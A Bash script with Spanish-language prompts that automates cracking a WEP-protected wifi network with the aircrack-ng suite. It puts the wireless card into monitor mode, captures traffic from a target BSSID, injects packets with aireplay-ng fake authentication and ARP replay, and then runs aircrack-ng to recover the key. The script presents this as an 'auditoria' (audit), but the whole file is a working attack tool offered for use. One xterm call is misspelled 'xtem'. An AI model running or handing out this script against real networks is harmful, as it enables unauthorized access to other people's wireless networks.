#!/bin/bash

ROJO=$(tput setaf 1)
VERDE=$(tput setaf 2)
echo $VERDE

iwconfig | awk '(NR == 1) { print "Tu interfaz de red inalambrica es : " $1}'
echo -e "\n"
echo "Escribe el nombre de la tarjeta de red de la cual vas a crear una interfaz en modo monitor "
echo $ROJO
read tarjeta

airmon-ng start $tarjeta
sleep 2
clear

iwconfig | grep mon

echo $VERDE
echo "Escribe el nombre de la interfaz que se encuentra en modo monitor "
echo $ROJO
read monitor

xterm -bg black -fg green -geometry 157-37+1+0 -T "Redes wifi disponibles" -e airodump-ng $monitor &
echo $VERDE
echo "Escribe el nombre del archivo donde se van a guardar los datos capturados"
echo $ROJO
read nombre
echo $VERDE
echo "Escribe el numero de canal de la red wifi que vas a realizar la auditoria"
echo $ROJO
read canal
echo $VERDE
echo "Escribe el BSSID de la red wifi en la que vas a realizar la auditoria"
echo $ROJO
read bssid

xtem -bg black -fg green -geometry 157-37+1+0 -T "Crackeando la red wifi" -e airodump-ng -w $nombre -c $canal --bssid $bssid --ignore-negative-one $monitor &
sleep 2

xterm -bg black -fg green -geometry 157-37+1+0 -T "Autentificando" -e aireplay-ng -1 0 -a $bssid  --ignore-negative-one $monitor &
sleep 2

xterm -bg black -fg green -geometry 157-37+1+0 -T "Inyectando paquetes" -e aireplay-ng -3 -b $bssid --ignore-negative-one $monitor
sleep 2

echo $VERDE
echo "Para obtener la clave de la red wifi debes de tener mas de 20,000 en la columna data, en caso de que haya mas de 20,000 data escribe el numero 1 y luego da enter "
until [ $respuesta = 1 ]; do
    echo "1) Ya tengo mas de 20,000 data!!!"
    echo "2) Todavia no tengo 20,000 data"
    echo -n "#?"
    read respuesta
done

aircrack-ng $nombre*.cap
sleep 2
airmon-ng stop $monitor
exit
